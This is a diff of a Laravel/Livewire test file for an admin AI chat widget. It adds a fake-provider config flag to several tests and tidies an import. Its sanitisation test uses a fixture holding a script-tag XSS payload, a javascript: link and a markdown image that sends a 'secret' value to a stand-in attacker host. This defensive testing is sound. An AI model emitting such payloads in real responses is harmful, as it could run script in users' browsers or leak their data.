@@ -9,6 +9,7 @@ use App\Models\AiChatProposal;
 use App\Models\AiChatUsage;
 use App\Models\User;
 use App\Services\SiteSettingService;
+use Illuminate\Database\Eloquent\ModelNotFoundException;
 use Illuminate\Foundation\Testing\RefreshDatabase;
 use Illuminate\Support\Facades\Storage;
 use Livewire\Features\SupportLockedProperties\CannotUpdateLockedPropertyException;
@@ -150,7 +151,7 @@ class AiChatWidgetFlowTest extends TestCase
             ->assertNotDispatched('fill-form-field');
 
         // 남의 메시지는 찾을 수 없다.
-        $this->expectException(\Illuminate\Database\Eloquent\ModelNotFoundException::class);
+        $this->expectException(ModelNotFoundException::class);
         Livewire::test(AiChatWidget::class, ['screenPath' => 'admin/popups/create'])->call('fillTextField', $theirs->id, 'title');
     }
 
@@ -212,6 +213,7 @@ class AiChatWidgetFlowTest extends TestCase
     public function test_sending_with_the_fake_provider_creates_a_card_and_updates_the_remaining_counts(): void
     {
         $this->app['env'] = 'local';
+        config(['services.ai.fake_provider' => true]);
         $admin = $this->admin();
         $this->actingAs($admin);
 
@@ -238,6 +240,7 @@ class AiChatWidgetFlowTest extends TestCase
     public function test_a_rejected_send_keeps_the_typed_text_and_shows_the_limit_notice_without_creating_anything(): void
     {
         $this->app['env'] = 'local';
+        config(['services.ai.fake_provider' => true]);
         app(SiteSettingService::class)->set('ai_chat_daily_limit_per_admin', '0', 'ai');
         $this->actingAs($this->admin());
 
@@ -258,6 +261,7 @@ class AiChatWidgetFlowTest extends TestCase
     public function test_remaining_counts_come_from_usage_rows_and_do_not_grow_back_when_conversations_are_deleted(): void
     {
         $this->app['env'] = 'local';
+        config(['services.ai.fake_provider' => true]);
         $admin = $this->admin();
         $this->actingAs($admin);
         app(SiteSettingService::class)->set('ai_chat_daily_limit_per_admin', '2', 'ai');
@@ -276,6 +280,7 @@ class AiChatWidgetFlowTest extends TestCase
     {
         Storage::fake('uploads');
         $this->app['env'] = 'local';
+        config(['services.ai.fake_provider' => true]);
         $admin = $this->admin();
         $this->actingAs($admin);
 
@@ -297,6 +302,7 @@ class AiChatWidgetFlowTest extends TestCase
     public function test_image_card_button_shows_a_notice_when_the_image_limit_is_used_up(): void
     {
         $this->app['env'] = 'local';
+        config(['services.ai.fake_provider' => true]);
         app(SiteSettingService::class)->set('ai_image_daily_limit_per_admin', '0', 'ai');
         $this->actingAs($this->admin());
 
@@ -321,6 +327,7 @@ class AiChatWidgetFlowTest extends TestCase
     {
         Storage::fake('uploads');
         $this->app['env'] = 'local';
+        config(['services.ai.fake_provider' => true]);
         $owner = $this->admin('owner@test.local');
         $this->actingAs($owner);
         Livewire::test(AiChatWidget::class)->set('selectedProvider', 'fake')->set('input', '팝업 만들어줘')->call('send');
@@ -377,7 +384,7 @@ class AiChatWidgetFlowTest extends TestCase
     {
         $this->enableProvider();
         $admin = $this->admin();
-        $conversation = $this->conversationWithAnswer($admin, "**굵게** [링크](https://example.com) <script>alert(1)</script> ![추적](https://evil.test/p.png?q=secret) [나쁨](javascript:alert(1))");
+        $conversation = $this->conversationWithAnswer($admin, '**굵게** [링크](https://example.com) <script>alert(1)</script> ![추적](https://evil.test/p.png?q=secret) [나쁨](javascript:alert(1))');
         $this->actingAs($admin);
 
         $html = Livewire::test(AiChatWidget::class)
